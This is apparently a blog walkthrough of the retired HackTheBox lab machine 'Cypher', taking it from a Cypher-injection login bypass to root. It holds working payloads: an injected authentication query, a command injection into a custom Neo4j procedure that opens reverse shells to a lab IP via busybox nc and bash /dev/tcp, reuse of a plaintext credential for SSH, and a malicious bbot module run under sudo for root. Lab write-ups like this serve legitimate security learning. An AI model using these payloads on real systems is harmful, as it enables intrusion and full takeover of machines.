---
layout: post
title: "Cypher"
date: 2025-07-26
categories: [htb, medium]
provider: htb
machine: cypher
retired: true
---

At the time I beat it, Cypher was my favourite box! All of the steps needed manual exploitation, requiring some not-so-superficial research, with just enough information to go on. No CVEs, no [GTFObins](https://gtfobins.github.io/), but not hard to work out either, it is a great step up if you want your hand at a harder-than-easy machine. I guess that's why they rated it medium. Huh.

<div class="attack-chain">
  {% include attack-step.html title="Test web app" description="Discovered login form is vulnerable to Cypher injection" type="enum" %}
  {% include attack-step.html title="Bypass authentication" description="Obtained access to application via Cypher injection" type="attack" %}
  {% include attack-step.html title="Enumerate web server" description="Discovered and decompiled custom database procedure by content bruteforce" type="enum" %}
  {% include attack-step.html title="RCE via command injection" description="Obtained RCE via unsanitised shell command in custom procedure" type="attack" %}
  {% include attack-step.html title="Foothold" description="Discovered credentials in site configuration and reused them to log into SSH as user `graphasm`" type="foothold" %}
  {% include attack-step.html title="Enumerate permissions" description="Discovered that `graphasm` can run `bbot` as root via sudo" type="enum" %}
  {% include attack-step.html title="Privilege escalation" description="Abused python module feature in `bbot` to gain root shell via sudo" type="root" %}
</div>

## Meat Beat Manifesto's "Prime Audio Soup" on
We always start with `nmap`, and the results for Linux machines on HTB are usually the same: we have open HTTP and SSH ports. The website tries to sell you some _"proprietary graph technology"_, and my poor VM on a laptop complained about the background animation eating up all its cycles.

There's a login page, and the usual guesses for bad credentials don't work. Next up in our checklist is subdirectory bruteforcing, and aside from the pages we already could reach by browsing the site, we find an otherwise unreachable `testing` page:
```
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cypher.htb/FUZZ   -ic  

<SNIP>
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 23ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 24ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 24ms]
login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 24ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 25ms]
:: Progress: [4744/4744] :: Job [1/1] :: 1680 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

A bigger wordlist doesn't find anything else, and neither does a virtual host bruteforce attempt. A quick fuzz of the `api` endpoint with API-related wordlists also comes up empty, so we turn our attention to the `testing` page we discovered, and find a directory listing with a single downloadable `custom-apoc-extension-1.0-SNAPSHOT.jar` file inside.

Unpacking this file shows a few Java classes we can try to decompile, but until we do that there's not much else of interest, aside from discovering the version of Neo4j that this extension requires for whatever it is that it does:
```
$ unzip custom-apoc-extension-1.0-SNAPSHOT.jar
<SNIP>

$ cat META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml
<SNIP>
    <properties>
        <neo4j.version>5.23.0</neo4j.version>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
	</properties>
<SNIP>
```

A compulsory search for vulnerabilities on that version didn't find anything. I didn't look further into the JAR yet, because I thought I first needed to get past the authentication on the site and was not convinced that the file had anything to do with that.

At this point we could fairly assume that a Neo4j database was backing the site's functionality, so maybe it handled the authentication as well. The default Neo4j credentials (`neo4j:neo4j`) also don't get us anywhere, but we can get a bit creative before moving on if nothing works. I tried a simple _SQL_ injection payload, `' or 1=1; -- `,  on the username and password, and an error message briefly popped up on the site. Ha! 

## There are more things in life than just SQL
I checked the response in Burp, and indeed it looked like we could do something with this (note that I did all this in Burp, because I'm not insane, but I've turned these into (valid) `curl` calls for illustration):
```
$ curl -s -k -X 'POST' -H 'Host: cypher.htb' -H 'Content-Type: application/json' -H 'Origin: http://cypher.htb' -H 'Referer: http://cypher.htb/login' -H $'Connection: keep-alive' --data-binary $'{\"username\":\"\' or 1=1; -- \",\"password\":\"\' or 1=1; -- \"}' 'http://cypher.htb/api/auth' 
<SNIP>
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Invalid input '-': expected 'FOREACH', 'ALTER', 'ORDER BY', 'CALL', 'USING PERIODIC COMMIT', 'CREATE', 'LOAD CSV', 'START DATABA
SE', 'STOP DATABASE', 'DEALLOCATE', 'DELETE', 'DENY', 'DETACH', 'DROP', 'DRYRUN', 'FINISH', 'GRANT', 'INSERT', 'LIMIT', 'MATCH', 'MERGE', 'NODETACH', 'OFFSET', 'OPTIONAL', 'REALLOCATE', 'REMOVE', 'RENAME', 'RETURN', 'REV
OKE', 'ENABLE SERVER', 'SET', 'SHOW', 'SKIP', 'TERMINATE', 'UNWIND', 'USE', 'WITH' or <EOF> (line 1, column 64 (offset: 63))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' or 1=1; -- ' return h.value as hash"
                                                                ^}
<SNIP>
```

So clearly our input is being placed in the middle of a query without sanitisation, opening it up to injection. Looking at the query itself, we confirm that we are dealing with Neo4j and its query language Cypher, which you might remember from it being used in our trusty BloodHound.

Being both lazy and an idiot, I actually tried throwing SQLmap at this. It "surprisingly" told me that the parameter wasn't injectable, though I clearly saw that it was, but it eventually dawned on me that SQLmap's thing is SQL, not Cypher. I found out later that there's a [cyphermap](https://github.com/sectroyer/cyphermap), so we'll give that a spin next time. But at this point I decided to try to figure this out manually.

Looking at that query again, it's looking up a user by name and returning their linked SHA1 "secret". Our password will therefore probably be hashed and the result compared with this secret, to determine whether we can login or not. So:
- we can affect the query to some degree;
- whatever we do, the result of it will probably be compared with the password we passed;
- the password we passed will be hashed with SHA1.

Considering all this, we need to make the query return a value that we control, and pass the same value through the password field, making the login logic let us through.

First, we choose a password, and get its SHA1 checksum:
```
$ echo -n 1 | sha1sum
356a192b7913b04c54574d18c28d46e6395428ab  -
```

Next, we work on the payload for the username. We're going to keep the `' or 1=1` start, hoping to select _some_ user. We'll want to end the payload with an inline comment, which in Cypher is represented by `//`, to discard the end of the existing query and make our lives easier generating a valid new one. But we want our new query to be very similar, except we want to return our hashed password. All put together, our payload should look like this:
```
' or 1=1 return '356a192b7913b04c54574d18c28d46e6395428ab' as hash //
```

... which will result in the following query:
```
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' or 1=1 return '356a192b7913b04c54574d18c28d46e6395428ab' as hash // ...
```

Together with `1` for password, great success:
```
$ curl -i -s -k -X 'POST' -H 'Host: cypher.htb' -H 'Content-Type: application/json' -H 'Origin: http://cypher.htb' -H 'Referer: http://cypher.htb/login' -H $'Connection: keep-alive' --data-binary $'{\"username\":\"\' or 1=1  return \'356a192b7913b04c54574d18c28d46e6395428ab\' as hash //\",\"password\":\"1\"}' 'http://cypher.htb/api/auth'
<SNIP>
set-cookie: access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiInIG9yIDE9MSAgcmV0dXJuICczNTZhMTkyYjc5MTNiMDRjNTQ1NzRkMThjMjhkNDZlNjM5NTQyOGFiJyBhcyBoYXNoIC8vIiwiZXhwIjoxNzUxNTE0OTY2fQ.drAN69RhVUiPiNuAS_n8o0FTMHF4G7wev2jvGnqZlx8; Path=/; SameSite=lax

ok
```

Using those "credentials" on the login form (or setting the cookie in our session and refreshing the page), we are finally inside the demo application.

## A more secondary Matrix character
Once inside, the page allows us to enter a Cypher query, by selecting from a list of presets or typing it out, and runs it on its database, presenting textual results and a graph representation that looks cool but as far as I can tell is otherwise useless. Like many things in 2025, actually, but maybe I'm just old and grumpy.

I found [a great reference](https://pentester.land/blog/cypher-injection-cheatsheet/) on Cypher, both to understand the query language but also potential exploitation avenues. The "Select All" preset query does show literally everything, but without knowing what any of it is, it's not the most helpful. Turning to the reference and to the authentication query we discovered early, we slightly modify it to list all users and their SHA1 secrets, with `MATCH (u:USER) -[:SECRET]-> (h:SHA1) return u, h`. It turns out there's a single user, `graphasm`, which is us right now. We excitedly throw the SHA1 hash at `hashcat`, but...
```
$ hashcat 9f54ca4c130be6d529a56dee59dc2b2090e43acf ../rockyou.txt -m 100
<SNIP>
Status...........: Exhausted
```

I tried [Crackstation](https://crackstation.net/) as well for good measure, but still no dice. I went back to the Cypher reference I mentioned earlier, to see what else I could glean from the system by using queries. As I skimmed through the index on the right, the [APOC library](https://pentester.land/blog/cypher-injection-cheatsheet/#apoc-library) entry stood out. Remember the JAR file we found earlier? `custom-apoc-extension`. OK, what's this about?

From [the docs](https://neo4j.com/docs/apoc/5/introduction/), _"The APOC Core library provides access to user-defined procedures and functions which extend the use of the Cypher query language"_. Neo(4j), Cypher and APOC? [Not too subtle :)](https://github.com/neo4j-contrib/neo4j-apoc-procedures?tab=readme-ov-file#apoc-name-history). Anyway, it's clearly time to decompile the Java classes we found in the JAR file earlier! 

There's plenty of apps out there to do this, but I was in a hurry so I used [an online one](https://www.decompiler.com), which is fine for this purpose. Looking at the decompiled "CustomFunctions.java" we see the definition of a procedure, with the most important chunk of it being the following:
```
<SNIP>
   @Procedure(
      name = "custom.getUrlStatusCode",
      mode = Mode.READ
   )
   @Description("Returns the HTTP status code for the given URL as a string")
   public Stream<CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      <SNIP>

      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
<SNIP>
```

So:
- we have a procedure called `custom.getUrlStatusCode`;
- it takes a URL as a parameter;
- it appends that URL to the end of a parametrised call to `curl` through `/bin/sh`;
- it executes the `/bin/sh` command on the system.

It looks like whoever wrote all these apps didn't care much for sanitisation, this time opening up the door to a command injection. It should be possible to call this procedure with a payload that adds another system command after the irrelevant call to `curl`, like a reverse shell call.

I spent more time here than I should have, but I'll spare you most of the troubles. I won't spare you the lessons learned, though, because that's what we're here for. The first "lesson" is to read things more carefully. The first payload I tried to use was my go-to `bash` reverse shell:
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Because the command in Java was already using the `-c` parameter, I limited the payload to the `bash -i ...` call. This failed to the point of me assuming that the system didn't have `bash` installed, and moving on to the payload I'll describe later. It was only when writing this up that I realised that the Java code is calling _sh_, not _bash_. `sh` has no idea what `/dev/tcp/10.10.10.10/1234` means, as that is a `bash` construct, so this couldn't work. The payload does work if it includes the `bash -c ...` call, to ensure that the rest is interpreted by `bash`. You'll just need to URL-encode the `&` characters.

Speaking of which, the other lesson learned is to watch your URL-encoded payloads closely, and/or to rely less on Burp Repeater when you can have an easier time submitting your payload directly on the application. Some strange characters made their way into my payload, causing it to fail and causing me to waste time until I decoded the payload as a sanity-check.

All those struggles aside, let's get back to the task at hand. Looking back at our Cypher reference, these procedures are called in the following format: `CALL procedureName(parameter) YIELD value RETURN value`. Using the information we gathered above, and after all the struggles, we come to the following payload as an example:
```
CALL custom.getUrlStatusCode('http://127.0.0.1 ; busybox nc 10.10.14.133 1234 -e sh') YIELD statusCode RETURN statusCode
```

You can literally just paste this on the application's query bar, no need to mess around in Burp like I did. After setting up a `netcat` listener, and executing the query, \[hacker voice\] _we're in_:
```
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.231.244] 44430
whoami
neo4j
python3 -c 'import pty; pty.spawn("/bin/bash")'
neo4j@cypher:/$  
```

## A bot called BBOT
We _are_ in but we are not who we want to be yet. Looking in the `/home` directory we see we probably want to become `graphasm` again:
```
neo4j@cypher:/home$ ls -lah
ls -lah
total 12K
drwxr-xr-x  3 root     root     4.0K Oct  8  2024 .
drwxr-xr-x 22 root     root     4.0K Feb 17 16:48 ..
drwxr-xr-x  4 graphasm graphasm 4.0K Feb 17 12:40 graphasm
```

We also see that we can... also see inside `graphasm`'s home directory. Don't mind if we do... The user flag is protected, but rummaging through the files yields the following:
```
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: <REDACTED>
```

Are we finally _really_ in? Yes we are:
```
$ ssh graphasm@cypher.htb
graphasm@cypher.htb's password:
<SNIP>
graphasm@cypher:~$  
```

OK! Now onto privilege escalation. I'm secretly hoping you're a long-time reader of my write-ups at this point, and that you know what I'm going to say next: `id` and `sudo -l`. And there's a reason for it!
```
graphasm@cypher:~$ id                        
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                       
User graphasm may run the following commands on cypher:                        
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Cool, another binary that we can probably subvert to gain root access. I had no idea what `bbot` was. Looking at the help menu is usually a good way of figuring that out, but also of finding ways to pass commands to `sudo` binaries (like we saw in [Dog](/writeups/dog/)). I learned that `bbot` is an impressive tool for OSINT, but nothing in the help menu stood out in terms of it being obviously abusable for privilege escalation.

The [user manual](https://www.blacklanternsecurity.com/bbot/Stable/) didn't offer easy options either, unless I missed something, but the developer manual explains [how to write a (python) module](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/). It looks like we can make the module do _anything_, so I wrote the bare-bonesest module to spawn a shell:
```
graphasm@cypher:~$ cat pwn.py 
from bbot.modules.base import BaseModule

class pwn(BaseModule):
    async def setup(self):
        import pty
        pty.spawn("/bin/bash")
```

Modules are apparently loaded from some default location, which maybe we could write to. But the module explains how to [load modules from custom locations](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/#load-modules-from-custom-locations) via [presets](https://www.blacklanternsecurity.com/bbot/Stable/scanning/presets/#how-to-use-presets-p), so picking from different parts of the manual I cobbled together another bare-bones preset yaml file: 
```
graphasm@cypher:~$ cat modules.yml 
description: pwn

module_dirs:
  - /home/graphasm/
```

And sometimes, just sometimes, bare-bones is all you need:
```
graphasm@cypher:~$ sudo bbot -p ./modules.yml -m pwn
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Scan with 1 modules seeded with 0 targets (0 in whitelist)
[INFO] Loaded 1/1 scan modules (pwn)
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
root@cypher:/home/graphasm#  
```

## Roll the credits
- Slow is smooth, and smooth is fast. Letting it _hit_ that I was dealing with Cypher, not SQL, and with 'sh' and not 'bash', for example, would have saved a lot of time.
- Decode and check your URL-encoded payloads sooner rather than later, when they don't work.
- Tools are great, and we stand on the shoulders of giants, but trust your ability to exploit something manually and to learn a ton in the process.
- As always, for reading this far, you're a champ.